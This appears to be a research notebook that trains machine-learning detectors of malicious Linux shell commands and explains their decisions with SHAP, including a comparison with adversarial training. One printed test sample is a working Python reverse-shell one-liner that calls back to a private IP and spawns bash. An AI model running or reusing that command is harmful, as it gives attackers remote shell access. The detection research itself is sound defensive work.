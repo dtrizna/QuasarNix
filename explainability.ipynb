{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 114,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[!] Script start time: Sat Feb  3 10:11:09 2024\n",
      "[*] Fitting One-Hot encoder...\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "import time\n",
    "from watermark import watermark\n",
    "\n",
    "import numpy as np\n",
    "import shutil\n",
    "\n",
    "from nltk.tokenize import wordpunct_tokenize\n",
    "from sklearn.linear_model import LogisticRegression\n",
    "from xgboost import XGBClassifier\n",
    "\n",
    "from src.preprocessors import OneHotCustomVectorizer\n",
    "from src.data_utils import load_data\n",
    "from src.tabular_utils import training_tabular\n",
    "\n",
    "import shap\n",
    "\n",
    "SEED = 33\n",
    "VOCAB_SIZE = 4096\n",
    "MAX_LEN = 128\n",
    "\n",
    "LIMIT = 30000\n",
    "\n",
    "# ===========================================\n",
    "print(f\"[!] Script start time: {time.ctime()}\")\n",
    "TOKENIZER = wordpunct_tokenize\n",
    "\n",
    "# LOADING DATA\n",
    "ROOT = \"./\"\n",
    "X_train_cmds, y_train, X_test_cmds, y_test, X_train_malicious_cmd, X_train_baseline_cmd, X_test_malicious_cmd, X_test_baseline_cmd = load_data(ROOT, SEED, limit=LIMIT)\n",
    "\n",
    "# PREPROCESSING\n",
    "# tokenizer = CommandTokenizer(tokenizer_fn=TOKENIZER, vocab_size=VOCAB_SIZE, max_len=MAX_LEN)\n",
    "oh = OneHotCustomVectorizer(tokenizer=TOKENIZER, max_features=VOCAB_SIZE)\n",
    "print(\"[*] Fitting One-Hot encoder...\")\n",
    "X_train_onehot = oh.fit_transform(X_train_cmds)\n",
    "X_test_onehot = oh.transform(X_test_cmds)\n",
    "\n",
    "def parse_top_features_for_latex(x):\n",
    "    return str(x)[1:-1].replace(\"'\", \"\").replace(\", \", \") & \").replace(\":\", \" (\") + \")\"\n",
    "\n",
    "def get_top_features(\n",
    "        explanations,\n",
    "        features: list,\n",
    "        which_features: str,\n",
    "        top=10,\n",
    "        round_digits=2\n",
    "):\n",
    "    assert which_features in [\"malicious\", \"benign\", \"abs\"]\n",
    "    if which_features == \"abs\":\n",
    "        mean_shap_values = np.mean(explanations.abs.values, axis=0)\n",
    "    elif isinstance(explanations, np.ndarray):\n",
    "        mean_shap_values = np.mean(explanations, axis=0)\n",
    "    else:\n",
    "        mean_shap_values = np.mean(explanations.values, axis=0)\n",
    "    if which_features in [\"malicious\", \"abs\"]:\n",
    "        top_idx = np.argsort(mean_shap_values)[-top:][::-1]\n",
    "    else:\n",
    "        top_idx = np.argsort(mean_shap_values)[:top]\n",
    "    top_features = {features[idx]: round(mean_shap_values[idx], round_digits) for idx in top_idx}\n",
    "    return top_features\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Logistic Regression"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[*] Training log_reg_onehot model...\n",
      "[!] log_reg_onehot model scores: train_tpr=1.0000, train_f1=1.0000, train_acc=1.0000, train_auc=1.0000\n",
      "[!] log_reg_onehot model scores: val_tpr=0.9989, val_f1=0.9995, val_acc=0.9995, val_auc=1.0000\n"
     ]
    }
   ],
   "source": [
    "log_reg_onehot = LogisticRegression(random_state=SEED)\n",
    "\n",
    "log_reg_trained = training_tabular(\n",
    "    model=log_reg_onehot,\n",
    "    name=\"log_reg_onehot\",\n",
    "    X_train_encoded=X_train_onehot,\n",
    "    X_test_encoded=X_test_onehot,\n",
    "    y_train=y_train,\n",
    "    y_test=y_test,\n",
    "    logs_folder=\"./temp\",\n",
    "    model_file=None\n",
    ")\n",
    "shutil.rmtree('./temp')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 576x828 with 2 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "explainer = shap.LinearExplainer(\n",
    "    log_reg_trained,\n",
    "    X_train_onehot,\n",
    "    feature_names=list(oh.vocab.keys())\n",
    ")\n",
    "shap_values_logreg = explainer(X_test_onehot)\n",
    "shap.plots.beeswarm(shap_values_logreg, max_display=25)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['10', '.', 'nc', '127', 'r', 'rcat', 'e', 'dash', 'cu', 'eu', '0', '3', 'i', '<&', '(\"']\n"
     ]
    }
   ],
   "source": [
    "# get weights of log reg model\n",
    "log_reg_weights = log_reg_trained.coef_\n",
    "vocab = oh.vocab\n",
    "\n",
    "# find top 10 most important features\n",
    "TOP_HEAVIEST = 15\n",
    "top_malicious_idx = np.argsort(log_reg_weights[0])[-TOP_HEAVIEST:][::-1]\n",
    "top_malicious_features = [list(vocab.keys())[idx] for idx in top_malicious_idx]\n",
    "print(top_malicious_features)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['c', 'proc', 'net', 'internal', 'cloudapp', 'exe', 'readlink', 'var', 'lib', 'w', 'o365ip', 'py', '}', 'etc', '\"']\n"
     ]
    }
   ],
   "source": [
    "TOP_LIGHT = 15\n",
    "top_benign_idx = np.argsort(log_reg_weights[0])[:TOP_LIGHT]\n",
    "top_benign_features = [list(vocab.keys())[idx] for idx in top_benign_idx]\n",
    "print(top_benign_features)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## GBDT"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[*] Training xgb_model_onehot model...\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[!] xgb_model_onehot model scores: train_tpr=1.0000, train_f1=1.0000, train_acc=1.0000, train_auc=1.0000\n",
      "[!] xgb_model_onehot model scores: val_tpr=1.0000, val_f1=0.9999, val_acc=0.9999, val_auc=1.0000\n"
     ]
    }
   ],
   "source": [
    "xgb_model_onehot = XGBClassifier(n_estimators=100, max_depth=10, random_state=SEED)\n",
    "\n",
    "xgb_model_onehot_trained = training_tabular(\n",
    "    model=xgb_model_onehot,\n",
    "    name=\"xgb_model_onehot\",\n",
    "    X_train_encoded=X_train_onehot,\n",
    "    X_test_encoded=X_test_onehot,\n",
    "    y_train=y_train,\n",
    "    y_test=y_test,\n",
    "    logs_folder=\"./temp\",\n",
    "    model_file=None\n",
    ")\n",
    "shutil.rmtree('./temp')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "ntree_limit is deprecated, use `iteration_range` or model slicing instead.\n"
     ]
    }
   ],
   "source": [
    "features = list(oh.vocab.keys())\n",
    "\n",
    "explainer = shap.Explainer(\n",
    "    xgb_model_onehot_trained,\n",
    "    feature_names=features\n",
    ")\n",
    "\n",
    "explanations = explainer(X_test_onehot)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 576x972 with 2 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "shap.plots.beeswarm(explanations, max_display=30)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 92,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'.': 0.7537,\n",
       " 'bin': 0.1829,\n",
       " 'memory': 0.0529,\n",
       " 'python': 0.0414,\n",
       " '2': 0.0315,\n",
       " '6': 0.0288,\n",
       " 'w': 0.021,\n",
       " '-': 0.013,\n",
       " '\"$': 0.0109,\n",
       " '54': 0.0049,\n",
       " ');': 0.0029,\n",
       " 'o365ip': 0.0026,\n",
       " 'logger': 0.0018,\n",
       " 'echo': 0.0007,\n",
       " 'py': 0.0006}"
      ]
     },
     "execution_count": 92,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "top_malicious_features = get_top_features(explanations, features, \"malicious\", top=15, round_digits=4)\n",
    "top_malicious_features"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 93,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'127': -0.7015,\n",
       " 'c': -0.5851,\n",
       " '10': -0.3544,\n",
       " '(\"': -0.0818,\n",
       " 'n': -0.0734,\n",
       " '/': -0.0652,\n",
       " 'lib': -0.0643,\n",
       " '0': -0.0626,\n",
       " 'nc': -0.0435,\n",
       " '=': -0.0404,\n",
       " '>&': -0.0364,\n",
       " 'bash': -0.0235,\n",
       " 'dev': -0.0189,\n",
       " 'e': -0.0173,\n",
       " '3': -0.0171}"
      ]
     },
     "execution_count": 93,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "top_benign_features = get_top_features(explanations, features, \"benign\", top=15, round_digits=4)\n",
    "top_benign_features"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 96,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'.': 5.35,\n",
       " '10': 2.12,\n",
       " 'c': 1.1,\n",
       " '127': 0.97,\n",
       " 'bin': 0.53,\n",
       " '=': 0.52,\n",
       " '(\"': 0.44,\n",
       " 'memory': 0.38,\n",
       " 'lib': 0.38,\n",
       " '>&': 0.23,\n",
       " '0': 0.21,\n",
       " '\"$': 0.2,\n",
       " ';': 0.17,\n",
       " '/': 0.16,\n",
       " 'bash': 0.16}"
      ]
     },
     "execution_count": 96,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "top_abs_features = get_top_features(explanations, features, \"abs\", top=15, round_digits=2)\n",
    "top_abs_features"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 97,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      ". ( 0.7537) & bin ( 0.1829) & memory ( 0.0529) & python ( 0.0414) & 2 ( 0.0315) & 6 ( 0.0288) & w ( 0.021) & - ( 0.013) & \"$ ( 0.0109) & 54 ( 0.0049) & ); ( 0.0029) & o365ip ( 0.0026) & logger ( 0.0018) & echo ( 0.0007) & py ( 0.0006)\n"
     ]
    }
   ],
   "source": [
    "print(parse_top_features_for_latex(top_malicious_features))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 98,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "127 ( -0.7015) & c ( -0.5851) & 10 ( -0.3544) & (\" ( -0.0818) & n ( -0.0734) & / ( -0.0652) & lib ( -0.0643) & 0 ( -0.0626) & nc ( -0.0435) & = ( -0.0404) & >& ( -0.0364) & bash ( -0.0235) & dev ( -0.0189) & e ( -0.0173) & 3 ( -0.0171)\n"
     ]
    }
   ],
   "source": [
    "print(parse_top_features_for_latex(top_benign_features))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 99,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      ". ( 5.35) & 10 ( 2.12) & c ( 1.1) & 127 ( 0.97) & bin ( 0.53) & = ( 0.52) & (\" ( 0.44) & memory ( 0.38) & lib ( 0.38) & >& ( 0.23) & 0 ( 0.21) & \"$ ( 0.2) & ; ( 0.17) & / ( 0.16) & bash ( 0.16)\n"
     ]
    }
   ],
   "source": [
    "print(parse_top_features_for_latex(top_abs_features))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Compare with adversarial training"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn.utils import shuffle\n",
    "\n",
    "X_train_malicious_cmd_adv_file = r\".\\logs_adversarial_evasion\\hybrid_prob_0.5_attack_param_0.5_limit_30000\\X_train_malicious_cmd_adv.json\"\n",
    "\n",
    "with open(X_train_malicious_cmd_adv_file, \"r\") as f:\n",
    "    X_train_malicious_cmd_adv = f.readlines()\n",
    "\n",
    "X_train_cmd_adv = X_train_baseline_cmd + X_train_malicious_cmd_adv\n",
    "y_train_adv = np.array([0] * len(X_train_baseline_cmd) + [1] * len(X_train_malicious_cmd_adv), dtype=np.int8)\n",
    "X_train_cmd_adv, y_train_adv = shuffle(X_train_cmd_adv, y_train_adv, random_state=SEED)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[*] Fitting One-Hot encoder...\n"
     ]
    }
   ],
   "source": [
    "oh_adv = OneHotCustomVectorizer(tokenizer=TOKENIZER, max_features=VOCAB_SIZE)\n",
    "print(\"[*] Fitting One-Hot encoder...\")\n",
    "X_train_onehot_adv = oh_adv.fit_transform(X_train_cmd_adv)\n",
    "X_test_onehot_adv = oh_adv.transform(X_test_cmds)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[*] Training xgb_model_onehot_adv model...\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[!] xgb_model_onehot_adv model scores: train_tpr=1.0000, train_f1=1.0000, train_acc=1.0000, train_auc=1.0000\n",
      "[!] xgb_model_onehot_adv model scores: val_tpr=0.4017, val_f1=0.5730, val_acc=0.7007, val_auc=0.9989\n"
     ]
    }
   ],
   "source": [
    "xgb_model_onehot_adv = XGBClassifier(n_estimators=100, max_depth=10, random_state=SEED)\n",
    "\n",
    "xgb_model_onehot_adv_trained = training_tabular(\n",
    "    model=xgb_model_onehot_adv,\n",
    "    name=\"xgb_model_onehot_adv\",\n",
    "    X_train_encoded=X_train_onehot_adv,\n",
    "    X_test_encoded=X_test_onehot_adv,\n",
    "    y_train=y_train_adv,\n",
    "    y_test=y_test,\n",
    "    logs_folder=\"./temp\",\n",
    "    model_file=None\n",
    ")\n",
    "shutil.rmtree('./temp')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "ntree_limit is deprecated, use `iteration_range` or model slicing instead.\n"
     ]
    }
   ],
   "source": [
    "features_adv = list(oh_adv.vocab.keys())\n",
    "\n",
    "explainer_adv = shap.Explainer(\n",
    "    xgb_model_onehot_adv_trained,\n",
    "    feature_names=features_adv\n",
    ")\n",
    "explanations_adv = explainer_adv(X_test_onehot_adv)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Getting color for legend"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [],
   "source": [
    "from shap.plots.colors._colorconv import lab2rgb, lch2lab\n",
    "\n",
    "# NOTE: code from shap.plots.colors._colors\n",
    "# to get correct blue and red\n",
    "\n",
    "def lch2rgb(x):\n",
    "    return lab2rgb(lch2lab([[x]]))[0][0]\n",
    "\n",
    "blue_lch = [54., 70., 4.6588]\n",
    "l_mid = 40.\n",
    "red_lch = [54., 90., 0.35470565 + 2* np.pi]\n",
    "gray_lch = [55., 0., 0.]\n",
    "blue_rgb = lch2rgb(blue_lch)\n",
    "red_rgb = lch2rgb(red_lch)\n",
    "gray_rgb = lch2rgb(gray_lch)\n",
    "white_rgb = np.array([1.,1.,1.])\n",
    "\n",
    "reds = []\n",
    "greens = []\n",
    "blues = []\n",
    "alphas = []\n",
    "nsteps = 100\n",
    "l_vals = list(np.linspace(blue_lch[0], l_mid, nsteps//2)) + list(np.linspace(l_mid, red_lch[0], nsteps//2))\n",
    "c_vals = np.linspace(blue_lch[1], red_lch[1], nsteps)\n",
    "h_vals = np.linspace(blue_lch[2], red_lch[2], nsteps)\n",
    "for pos,l,c,h in zip(np.linspace(0, 1, nsteps), l_vals, c_vals, h_vals):\n",
    "    lch = [l, c, h]\n",
    "    rgb = lch2rgb(lch)\n",
    "    reds.append((pos, rgb[0], rgb[0]))\n",
    "    greens.append((pos, rgb[1], rgb[1]))\n",
    "    blues.append((pos, rgb[2], rgb[2]))\n",
    "    alphas.append((pos, 1.0, 1.0))\n",
    "\n",
    "from matplotlib.colors import LinearSegmentedColormap\n",
    "\n",
    "red_blue = LinearSegmentedColormap('red_blue', {\n",
    "        \"red\": reds,\n",
    "        \"green\": greens,\n",
    "        \"blue\": blues,\n",
    "        \"alpha\": alphas\n",
    "    })\n",
    "blue = red_blue.get_under()\n",
    "red = red_blue.get_over()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 576x684 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "import matplotlib.pyplot as plt\n",
    "shap.plots.beeswarm(explanations_adv, max_display=20, show=False, color_bar=False, log_scale=False)\n",
    "\n",
    "# get axis\n",
    "ax = plt.gca()\n",
    "\n",
    "# LEGEND\n",
    "# red from RdBu colormap\n",
    "red_dot = plt.Line2D([0], [0], marker='o', color='w', markerfacecolor=red, markersize=10)\n",
    "# blue from RdBu colormap\n",
    "blue_dot = plt.Line2D([0], [0], marker='o', color='w', markerfacecolor=blue, markersize=10)\n",
    "ax.legend(\n",
    "    [red_dot, blue_dot],\n",
    "    ['Token Present', 'Token Absent'],\n",
    "    loc='lower right',\n",
    "    bbox_to_anchor=(1, 0),\n",
    "    # font size\n",
    "    fontsize=16\n",
    ")\n",
    "\n",
    "# get ytick labels\n",
    "yticks = ax.get_yticklabels()\n",
    "yticks = [ytick.get_text().replace(\"4077 other\", \"4077\\nother\") for ytick in yticks]\n",
    "ax.set_yticklabels(yticks)\n",
    "\n",
    "# increase font size of x and y labels, ticks, ticklabels\n",
    "ax.set_xlabel(ax.get_xlabel(), fontsize=16)\n",
    "ax.set_ylabel(ax.get_ylabel(), fontsize=16)\n",
    "ax.tick_params(axis='both', which='major', labelsize=16)\n",
    "\n",
    "plt.savefig(\"img/explainability_beeswarm_gbdt_adv.pdf\", bbox_inches='tight', dpi=300)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 167,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'.': 0.7537,\n",
       " 'bin': 0.1829,\n",
       " 'memory': 0.0529,\n",
       " 'python': 0.0414,\n",
       " '2': 0.0315,\n",
       " '6': 0.0288,\n",
       " 'w': 0.021,\n",
       " '-': 0.013,\n",
       " '\"$': 0.0109,\n",
       " '54': 0.0049,\n",
       " ');': 0.0029,\n",
       " 'o365ip': 0.0026,\n",
       " 'logger': 0.0018,\n",
       " 'echo': 0.0007,\n",
       " 'py': 0.0006}"
      ]
     },
     "execution_count": 167,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "top_malicious_features_adv = get_top_features(explanations_adv, features_adv, \"malicious\", top=25, round_digits=4)\n",
    "top_malicious_features"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 166,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'\"': -2.7571,\n",
       " '\\\\\"': -0.9828,\n",
       " 'i': -0.7715,\n",
       " '/': -0.341,\n",
       " '(\\\\\"': -0.1803,\n",
       " '-': -0.1775,\n",
       " 'lib': -0.1321,\n",
       " 'c': -0.1256,\n",
       " '\",': -0.1206,\n",
       " 'memory': -0.0814,\n",
       " '\"/': -0.0656,\n",
       " '.': -0.0591,\n",
       " '\"$': -0.0487,\n",
       " '[': -0.0243,\n",
       " 'ambari': -0.0243,\n",
       " '=': -0.0241,\n",
       " 'bash': -0.0184,\n",
       " 'scripts': -0.0173,\n",
       " 'proc': -0.0157,\n",
       " '\"^': -0.0114,\n",
       " 'usr': -0.0099,\n",
       " '>&': -0.0089,\n",
       " 'n': -0.0051,\n",
       " 'tcp': -0.002,\n",
       " '0': -0.0017}"
      ]
     },
     "execution_count": 166,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "top_benign_features_adv = get_top_features(explanations_adv, features_adv, \"benign\", top=25, round_digits=4)\n",
    "top_benign_features_adv"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 103,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'proc': 3.22,\n",
       " '\"': 2.8,\n",
       " '10': 1.22,\n",
       " 'i': 1.17,\n",
       " '\\\\\"': 0.98,\n",
       " ';': 0.89,\n",
       " '/': 0.62,\n",
       " '\",': 0.57,\n",
       " 'bin': 0.54,\n",
       " 'c': 0.51,\n",
       " '-': 0.48,\n",
       " 'lib': 0.37,\n",
       " 'memory': 0.35,\n",
       " '=': 0.29,\n",
       " '\"$': 0.28}"
      ]
     },
     "execution_count": 103,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "top_abs_features_adv = get_top_features(explanations_adv, features_adv, \"abs\", top=25, round_digits=2)\n",
    "top_abs_features_adv"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 104,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "; ( 0.4646) & 10 ( 0.4185) & bin ( 0.2275) & awk ( 0.0389) & 2 ( 0.0268) & 1 ( 0.0261) & 127 ( 0.0174) & -- ( 0.0074) & print ( 0.0058) & tag ( 0.0042) & sys ( 0.0042) & sh ( 0.0025) & o ( 0.0021) & rx ( 0.0018) & version ( 0.0017)\n"
     ]
    }
   ],
   "source": [
    "print(parse_top_features_for_latex(top_malicious_features_adv))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 105,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\" ( -2.7571) & \\\\\" ( -0.9828) & i ( -0.7715) & / ( -0.341) & (\\\\\" ( -0.1803) & - ( -0.1775) & lib ( -0.1321) & c ( -0.1256) & \", ( -0.1206) & memory ( -0.0814) & \"/ ( -0.0656) & . ( -0.0591) & \"$ ( -0.0487) & [ ( -0.0243) & ambari ( -0.0243)\n"
     ]
    }
   ],
   "source": [
    "print(parse_top_features_for_latex(top_benign_features_adv))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 106,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "proc ( 3.22) & \" ( 2.8) & 10 ( 1.22) & i ( 1.17) & \\\\\" ( 0.98) & ; ( 0.89) & / ( 0.62) & \", ( 0.57) & bin ( 0.54) & c ( 0.51) & - ( 0.48) & lib ( 0.37) & memory ( 0.35) & = ( 0.29) & \"$ ( 0.28)\n"
     ]
    }
   ],
   "source": [
    "print(parse_top_features_for_latex(top_abs_features_adv))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Compare `explanations` and `explanations_adv`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Comparing sparse matrices using == is inefficient, try using != instead.\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 576x468 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "shap.plots.bar(explanations_adv[:1000].abs.max(0))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Comparing sparse matrices using == is inefficient, try using != instead.\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 576x468 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "shap.plots.bar(explanations[:1000].abs.max(0))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Comparing sparse matrices using == is inefficient, try using != instead.\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 576x468 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "shap.plots.bar(explanations_adv[:1000, r'\\\"'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Comparing sparse matrices using == is inefficient, try using != instead.\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 576x468 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "shap.plots.bar(explanations[:1000, \"10\"])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Mean as poor feature aggregation logic\n",
    "\n",
    "`memory` is purely benign token, e.g.:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "105"
      ]
     },
     "execution_count": 54,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "features.index('memory')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([-3.9427674 ,  0.09768753,  0.33518717], dtype=float32)"
      ]
     },
     "execution_count": 56,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "explanations.values[13:16, 105]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Heavy minus where memory is present, otherwise small plus when memory absent:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['awk /total_rss [0-9]+/ {printf  \"# HELP auditbeat_cgroups_rss_memory_size in bytes\\\\n# TYPE auditbeat_cgroups_rss_memory_size gauge\\\\nauditbeat_cgroups_rss_memory_size {pid=\\\\\"4067149\\\\\",ts=\\\\\"1691579355\\\\\"} \"$2\"\\\\n\" } /sys/fs/cgroup/memory/memory.stat',\n",
       " 'awk {printf  \"# HELP pushgw_cpu_usage scheduled in user and kernel mode (utime + stime + cutime + cstime) measured in milicores\\\\n# TYPE pushgw_cpu_usage counter\\\\npushgw_cpu_usage{pid=\\\\\"7\\\\\",ts=\\\\\"1691570443\\\\\",state=\\\\\"\"$3\"\\\\\",thds=\\\\\"\"$20\"\\\\\"} 0\\\\n\" } /proc/7/stat',\n",
       " 'python3 -c \\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.156.90.13\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")\\'']"
      ]
     },
     "execution_count": 57,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "X_test_cmds[13:16]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([[1.],\n",
       "       [0.],\n",
       "       [0.]])"
      ]
     },
     "execution_count": 59,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "X_test_onehot[13:16, 105].toarray()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Need to find positive activations, and take the mean of them."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 108,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([-0.1141464 ,  3.05403628,  0.04537274, ...,  0.        ,\n",
       "        0.        ,  0.        ])"
      ]
     },
     "execution_count": 108,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "assert X_test_onehot.shape == explanations.values.shape\n",
    "explanations_only_where_token_is_present = explanations.values * X_test_onehot.toarray()\n",
    "np.mean(explanations_only_where_token_is_present, axis=0)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 119,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      ". ( 3.05) & 10 ( 0.88) & bin ( 0.36) & = ( 0.24) & (\" ( 0.18) & 127 ( 0.13) & >& ( 0.1) & 2 ( 0.09) & ; ( 0.08) & 0 ( 0.07)\n"
     ]
    }
   ],
   "source": [
    "malicious_only_where_token_is_present = get_top_features(\n",
    "    explanations_only_where_token_is_present,\n",
    "    features,\n",
    "    \"malicious\",\n",
    "    top=10,\n",
    "    round_digits=2\n",
    ")\n",
    "print(parse_top_features_for_latex(malicious_only_where_token_is_present))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 120,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "c ( -0.84) & lib ( -0.22) & memory ( -0.16) & / ( -0.11) & \"$ ( -0.09) & bash ( -0.09) & n ( -0.07) & net ( -0.03) & o365ip ( -0.03) & stat ( -0.02)\n"
     ]
    }
   ],
   "source": [
    "benign_only_where_token_is_present = get_top_features(\n",
    "    explanations_only_where_token_is_present,\n",
    "    features,\n",
    "    \"benign\",\n",
    "    top=10,\n",
    "    round_digits=2\n",
    ")\n",
    "\n",
    "print(parse_top_features_for_latex(benign_only_where_token_is_present))"
